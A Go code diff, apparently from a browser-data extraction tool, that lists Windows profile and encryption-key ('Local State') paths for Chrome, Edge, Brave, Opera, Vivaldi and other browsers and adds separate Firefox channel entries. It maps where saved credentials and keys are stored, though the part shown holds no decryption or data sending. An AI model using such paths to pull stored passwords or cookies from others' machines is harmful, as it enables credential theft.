@@ -13,25 +13,29 @@ import (
 )
 
 const (
-	chromeProfilePath     = "/AppData/Local/Google/Chrome/User Data/*/"
-	chromeKeyPath         = "/AppData/Local/Google/Chrome/User Data/Local State"
-	chromeBetaProfilePath = "/AppData/Local/Google/Chrome Beta/User Data/*/"
-	chromeBetaKeyPath     = "/AppData/Local/Google/Chrome Beta/User Data/Local State"
-	chromiumProfilePath   = "/AppData/Local/Chromium/User Data/*/"
-	chromiumKeyPath       = "/AppData/Local/Chromium/User Data/Local State"
-	edgeProfilePath       = "/AppData/Local/Microsoft/Edge/User Data/*/"
-	edgeKeyPath           = "/AppData/Local/Microsoft/Edge/User Data/Local State"
-	braveProfilePath      = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/"
-	braveKeyPath          = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
-	speed360ProfilePath   = "/AppData/Local/360chrome/Chrome/User Data/*/"
-	qqBrowserProfilePath  = "/AppData/Local/Tencent/QQBrowser/User Data/*/"
-	firefoxProfilePath    = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default*/"
-	operaProfilePath      = "/AppData/Roaming/Opera Software/Opera Stable/"
-	operaKeyPath          = "/AppData/Roaming/Opera Software/Opera Stable/Local State"
-	operaGXProfilePath    = "/AppData/Roaming/Opera Software/Opera GX Stable/"
-	operaGXKeyPath        = "/AppData/Roaming/Opera Software/Opera GX Stable/Local State"
-	vivaldiProfilePath    = "/AppData/Local/Vivaldi/User Data/Default/"
-	vivaldiKeyPath        = "/AppData/Local/Vivaldi/Local State"
+	firefoxProfilePath        = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/"
+	fireFoxBetaProfilePath    = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-beta/"
+	fireFoxDevProfilePath     = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.dev-edition-default/"
+	fireFoxNightlyProfilePath = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-nightly/"
+	fireFoxESRProfilePath     = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-esr/"
+	chromeProfilePath         = "/AppData/Local/Google/Chrome/User Data/*/"
+	chromeKeyPath             = "/AppData/Local/Google/Chrome/User Data/Local State"
+	chromeBetaProfilePath     = "/AppData/Local/Google/Chrome Beta/User Data/*/"
+	chromeBetaKeyPath         = "/AppData/Local/Google/Chrome Beta/User Data/Local State"
+	chromiumProfilePath       = "/AppData/Local/Chromium/User Data/*/"
+	chromiumKeyPath           = "/AppData/Local/Chromium/User Data/Local State"
+	edgeProfilePath           = "/AppData/Local/Microsoft/Edge/User Data/*/"
+	edgeKeyPath               = "/AppData/Local/Microsoft/Edge/User Data/Local State"
+	braveProfilePath          = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/"
+	braveKeyPath              = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
+	speed360ProfilePath       = "/AppData/Local/360chrome/Chrome/User Data/*/"
+	qqBrowserProfilePath      = "/AppData/Local/Tencent/QQBrowser/User Data/*/"
+	operaProfilePath          = "/AppData/Roaming/Opera Software/Opera Stable/"
+	operaKeyPath              = "/AppData/Roaming/Opera Software/Opera Stable/Local State"
+	operaGXProfilePath        = "/AppData/Roaming/Opera Software/Opera GX Stable/"
+	operaGXKeyPath            = "/AppData/Roaming/Opera Software/Opera GX Stable/Local State"
+	vivaldiProfilePath        = "/AppData/Local/Vivaldi/User Data/Default/"
+	vivaldiKeyPath            = "/AppData/Local/Vivaldi/Local State"
 )
 
 var (
@@ -42,6 +46,31 @@ var (
 		Storage     string
 		New         func(profile, key, name, storage string) (Browser, error)
 	}{
+		"firefox": {
+			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
+			Name:        firefoxName,
+			New:         NewFirefox,
+		},
+		"firefox-beta": {
+			ProfilePath: os.Getenv("USERPROFILE") + fireFoxBetaProfilePath,
+			Name:        firefoxBetaName,
+			New:         NewFirefox,
+		},
+		"firefox-dev": {
+			ProfilePath: os.Getenv("USERPROFILE") + fireFoxDevProfilePath,
+			Name:        firefoxDevName,
+			New:         NewFirefox,
+		},
+		"firefox-nightly": {
+			ProfilePath: os.Getenv("USERPROFILE") + fireFoxNightlyProfilePath,
+			Name:        firefoxNightlyName,
+			New:         NewFirefox,
+		},
+		"firefox-esr": {
+			ProfilePath: os.Getenv("USERPROFILE") + fireFoxESRProfilePath,
+			Name:        firefoxESRName,
+			New:         NewFirefox,
+		},
 		"chrome": {
 			ProfilePath: os.Getenv("USERPROFILE") + chromeProfilePath,
 			KeyPath:     os.Getenv("USERPROFILE") + chromeKeyPath,
@@ -75,11 +104,6 @@ var (
 			ProfilePath: os.Getenv("USERPROFILE") + qqBrowserProfilePath,
 			Name:        qqBrowserName,
 			New:         NewChromium,
-		},
-		"firefox": {
-			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
-			Name:        firefoxName,
-			New:         NewFirefox,
 		},
 		"brave": {
 			ProfilePath: os.Getenv("USERPROFILE") + braveProfilePath,
